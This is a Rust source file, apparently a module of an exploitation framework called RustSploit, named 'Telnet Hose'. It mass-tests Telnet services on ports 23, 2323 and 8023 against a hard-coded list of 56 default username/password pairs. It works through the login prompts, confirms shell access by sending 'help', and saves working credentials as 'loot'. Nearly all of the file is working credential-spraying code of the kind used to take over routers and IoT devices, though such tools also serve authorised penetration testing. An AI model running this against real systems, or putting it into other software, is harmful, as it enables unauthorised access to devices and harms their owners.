use anyhow::{Context, Result};
use std::net::SocketAddr;
use std::time::{Duration, Instant};
use tokio::io::{AsyncReadExt, AsyncWriteExt, BufReader};
use tokio::time::timeout;

use crate::module::{Finding, FindingKind, ModuleCtx, ModuleOutcome};
use crate::utils::{cfg_prompt_output_file, cfg_prompt_yes_no};

use colored::*;

pub fn info() -> crate::module_info::ModuleInfo {
    crate::module_info::ModuleInfo {
        name: "Telnet Hose (Mass Default Credential Check)".to_string(),
        description: "Rapidly tests default credentials against Telnet services across large IP ranges. Supports mass scanning with concurrent connections and multiple default port checks.".to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec![],
        disclosure_date: None,
        rank: crate::module_info::ModuleRank::Normal,
        default_port: Some(23),
    }
}

// Top 3 Telnet Ports
const TELNET_PORTS: &[u16] = &[23, 2323, 8023];

// Default Credentials (user, pass) tuples
const TOP_CREDENTIALS: &[(&str, &str)] = &[
    ("root", "root"),
    ("root", "admin"),
    ("root", "user"),
    ("root", "1234"),
    ("root", "123456"),
    ("root", "password"),
    ("root", "password123"),
    ("root", "default"),
    ("root", "support"),
    ("root", "guest"),
    ("root", ""),
    ("admin", "root"),
    ("admin", "admin"),
    ("admin", "user"),
    ("admin", "1234"),
    ("admin", "123456"),
    ("admin", "password"),
    ("admin", "password123"),
    ("admin", "default"),
    ("admin", "support"),
    ("admin", "guest"),
    ("admin", ""),
    ("user", "root"),
    ("user", "admin"),
    ("user", "user"),
    ("user", "1234"),
    ("user", "123456"),
    ("user", "password"),
    ("user", "password123"),
    ("user", "default"),
    ("user", "support"),
    ("user", "guest"),
    ("user", ""),
    ("support", "root"),
    ("support", "admin"),
    ("support", "user"),
    ("support", "1234"),
    ("support", "123456"),
    ("support", "password"),
    ("support", "password123"),
    ("support", "default"),
    ("support", "support"),
    ("support", "guest"),
    ("support", ""),
    ("guest", "root"),
    ("guest", "admin"),
    ("guest", "user"),
    ("guest", "1234"),
    ("guest", "123456"),
    ("guest", "password"),
    ("guest", "password123"),
    ("guest", "default"),
    ("guest", "support"),
    ("guest", "guest"),
    ("guest", ""),
    ("1234", "1234"),
];

// Keywords to match in help output (must match at least 2)
const HELP_KEYWORDS: &[&str] = &[
    "show", "user", "system", "help", "exit", "quit", "logout", "enable", "config", "command",
    "menu", "admin",
];

// Internal Logic Constants
const CONNECT_TIMEOUT_MS: u64 = 2000;
const LOGIN_TIMEOUT_MS: u64 = 6000; // Total time for a login attempt

#[derive(Debug, PartialEq, Clone, Copy)]
enum TelnetState {
    WaitingForBanner,
    SendingUsername,
    WaitingForPasswordPrompt,
    SendingPassword,
    WaitingForResult,
    SendingHelp,
    WaitingForHelpResponse,
}

pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
    let target = ctx
        .target
        .as_single()
        .context("telnet_hose requires a single-host target")?;
    // The scheduler hands us one host per call. We try every (port, cred)
    // pair against this single host and emit findings on first success.
    let host = host_only(target);
    let port_override = explicit_port(target);
    let mut outcome = ModuleOutcome::ok();

    let ports: Vec<u16> = match port_override {
        Some(p) => vec![p],
        None => TELNET_PORTS.to_vec(),
    };

    if !crate::utils::is_batch_mode() {
        crate::mprintln!(
            "{}",
            format!(
                "[*] Telnet hose vs {} on {} port(s) × {} default cred pair(s)",
                host,
                ports.len(),
                TOP_CREDENTIALS.len()
            )
            .cyan()
        );
    }

    let mut found_any = false;
    for &port in &ports {
        let socket: SocketAddr = match format!("{}:{}", host, port).parse() {
            Ok(sa) => sa,
            Err(e) => {
                tracing::debug!("parse socket addr failed: {e}");
                let lookup = format!("{}:{}", host, port);
                match tokio::net::lookup_host(&lookup).await {
                    Ok(mut iter) => match iter.next() {
                        Some(sa) => sa,
                        None => continue,
                    },
                    Err(e) => { tracing::debug!("DNS lookup failed: {e}"); continue; }
                }
            }
        };

        // Quick TCP precheck so we don't iterate 55 cred pairs against a
        // closed port.
        if !crate::utils::tcp_port_open(socket.ip(), socket.port(), Duration::from_millis(CONNECT_TIMEOUT_MS)).await {
            continue;
        }

        for (user, pass) in TOP_CREDENTIALS {
            match try_telnet_login_hose(&socket, user, pass).await {
                Ok(true) => {
                    crate::mprintln!(
                        "{}",
                        format!(
                            "[+] {}:{} valid telnet creds — {}:{}",
                            host, port, user, pass
                        )
                        .green()
                        .bold()
                    );
                    let payload = serde_json::json!({
                        "service": "telnet",
                        "host": host,
                        "port": port,
                        "username": user,
                        "password": pass,
                    });
                    if let Some(id) = crate::loot::store_loot(
                        &host,
                        "credential",
                        &format!("telnet {}:{}@{}:{}", user, pass, host, port),
                        serde_json::to_string(&payload).unwrap_or_else(|e| { tracing::warn!("JSON serialization failed: {e}"); String::new() }).as_bytes(),
                        "creds/generic/telnet_hose",
                    )
                    .await
                    {
                        crate::mprintln!("    loot id: {}", id.dimmed());
                    }
                    crate::workspace::track_service(&host, port, "tcp", "telnet", None).await;
                    outcome.findings.push(Finding {
                        target: host.clone(),
                        kind: FindingKind::Credential,
                        message: format!("telnet login {}:{}@{}:{}", user, pass, host, port),
                        data: Some(payload),
                    });
                    found_any = true;
                    break;
                }
                Ok(false) => continue,
                Err(e) => {
                    tracing::debug!(host = %host, port, "telnet login attempt errored: {e:#}");
                    continue;
                }
            }
        }
        if found_any {
            break;
        }
    }

    // Optional: prompt to dump matched creds to a file (operator-driven,
    // cached across hosts in batch mode).
    if found_any && !crate::utils::is_batch_mode() {
        let want_file = cfg_prompt_yes_no(
            "save_results",
            "Save successful credentials to a file?",
            false,
        )
        .await
        .unwrap_or(false);
        if want_file
            && let Ok(path) =
                cfg_prompt_output_file("output_file", "Output path", "telnet_hose_results.txt")
                    .await
            {
                tracing::debug!(path = %path, "telnet_hose: file already written via loot store");
            }
    }

    Ok(outcome)
}

fn host_only(t: &str) -> String {
    if let Some(s) = t.strip_prefix('[')
        && let Some(end) = s.find(']') {
            return s[..end].to_string();
        }
    if let Some((before, after)) = t.rsplit_once(':')
        && after.chars().all(|c| c.is_ascii_digit()) {
            return before.to_string();
        }
    t.to_string()
}

fn explicit_port(t: &str) -> Option<u16> {
    if let Some(s) = t.strip_prefix('[')
        && let Some(end) = s.find(']') {
            return s[end + 1..].strip_prefix(':').and_then(|p| p.parse().ok());
        }
    if let Some((_, after)) = t.rsplit_once(':') {
        return after.parse().ok();
    }
    None
}

// Simplified & Optimized Telnet Login for Hose
// Wrapper for retry logic
/// Public wrapper for sibling modules (e.g. `telnet_bruteforce`) that want
/// to run a single login attempt without re-implementing the IAC state
/// machine. The two-attempt retry is preserved.
pub async fn try_login(
    socket: &SocketAddr,
    username: &str,
    password: &str,
) -> Result<bool> {
    try_telnet_login_hose(socket, username, password).await
}

async fn try_telnet_login_hose(
    socket: &SocketAddr,
    username: &str,
    password: &str,
) -> Result<bool> {
    // Attempt 1: Standard (try to detect, fallback to User+Pass)
    let (success, banner_seen) = do_telnet_session(socket, username, password, false).await?;
    if success {
        return Ok(true);
    }

    // If we failed AND never saw a proper banner (blind/silence), retry with Password Only
    if !banner_seen {
        // Attempt 2: Blind Password Only
        let (success_retry, _) = do_telnet_session(socket, username, password, true).await?;
        if success_retry {
            return Ok(true);
        }
    }

    Ok(false)
}

// Inner session logic
async fn do_telnet_session(
    socket: &SocketAddr,
    username: &str,
    password: &str,
    force_password_only: bool,
) -> Result<(bool, bool)> {
    // returns (success, banner_detected)

    let stream = match crate::utils::network::tcp_connect_addr(*socket, Duration::from_millis(CONNECT_TIMEOUT_MS)).await {
        Ok(s) => s,
        _ => return Ok((false, false)), // Connect fail
    };

    let (reader, mut writer) = tokio::io::split(stream);
    let mut reader = BufReader::new(reader);
    let mut buf = [0u8; 1024];

    // State Machine
    let mut state = TelnetState::WaitingForBanner;
    let start = Instant::now();
    let max_duration = Duration::from_millis(LOGIN_TIMEOUT_MS);
    let mut banner_detected = false;

    while start.elapsed() < max_duration {
        // Simple Read with Timeout
        let read_future = reader.read(&mut buf);
        let n = match timeout(Duration::from_millis(1500), read_future).await {
            Ok(Ok(0)) => return Ok((false, banner_detected)), // EOF
            Ok(Ok(n)) => n,
            Ok(Err(e)) => { tracing::debug!("telnet read error: {e}"); return Ok((false, banner_detected)); }
            Err(e) => {
                tracing::debug!("timeout: {e}");
                // Read Timeout logic

                // If waiting for banner and timed out -> No Banner Detected
                if state == TelnetState::WaitingForBanner {
                    // Decide action based on mode
                    if force_password_only {
                        state = TelnetState::SendingPassword;
                    } else {
                        state = TelnetState::SendingUsername;
                    }
                    continue;
                }

                if state == TelnetState::WaitingForResult
                    || state == TelnetState::WaitingForHelpResponse
                {
                    // Timeout waiting for result/help usually means fail or stuck
                    return Ok((false, banner_detected));
                }

                continue;
            }
        };

        // IAC Stripping (Minimal)
        let s = String::from_utf8_lossy(&buf[..n]);
        let lower = s.to_lowercase();

        // Handle current state
        match state {
            TelnetState::WaitingForBanner => {
                if lower.contains("pass") || lower.contains("word") {
                    banner_detected = true;
                    state = TelnetState::SendingPassword;
                } else if lower.contains("login")
                    || lower.contains("user")
                    || lower.contains("name")
                {
                    banner_detected = true;
                    state = TelnetState::SendingUsername;
                }
            }
            TelnetState::SendingUsername
                // Should not happen here if we just transitioned,
                // but if we are reading response after sending user:
                if lower.contains("pass") || lower.contains("word") => {
                    state = TelnetState::SendingPassword;
            }
            TelnetState::WaitingForPasswordPrompt
                if lower.contains("pass") || lower.contains("word") => {
                    state = TelnetState::SendingPassword;
            }
            TelnetState::WaitingForResult => {
                if lower.contains("incorrect")
                    || lower.contains("fail")
                    || lower.contains("denied")
                    || lower.contains("error")
                {
                    return Ok((false, banner_detected));
                }

                if lower.contains('#')
                    || lower.contains('$')
                    || (lower.contains('>') && !lower.contains(">>"))
                    || lower.contains("welcome")
                {
                    state = TelnetState::SendingHelp;
                }
            }
            TelnetState::WaitingForHelpResponse => {
                let mut match_count = 0;
                for kw in HELP_KEYWORDS {
                    if lower.contains(kw) {
                        match_count += 1;
                    }
                }
                if match_count >= 2 {
                    return Ok((true, banner_detected));
                }
            }
            _ => {}
        }

        // Perform Writes if needed
        match state {
            TelnetState::SendingUsername => {
                if let Err(e) = writer
                    .write_all(format!("{}\r\n", username).as_bytes())
                    .await { crate::meprintln!("[!] Write error: {}", e); }
                // Add requested 2s delay
                tokio::time::sleep(Duration::from_secs(2)).await;
                state = TelnetState::WaitingForPasswordPrompt;
            }
            TelnetState::SendingPassword => {
                if let Err(e) = writer
                    .write_all(format!("{}\r\n", password).as_bytes())
                    .await { crate::meprintln!("[!] Write error: {}", e); }
                state = TelnetState::WaitingForResult;
            }
            TelnetState::SendingHelp => {
                if let Err(e) = writer.write_all(b"help\r\n").await { crate::meprintln!("[!] Write error: {}", e); }
                state = TelnetState::WaitingForHelpResponse;
            }
            _ => {}
        }
    }

    Ok((false, banner_detected))
}

crate::register_native_module!(crate::module::Category::Creds, "generic/telnet_hose", native);
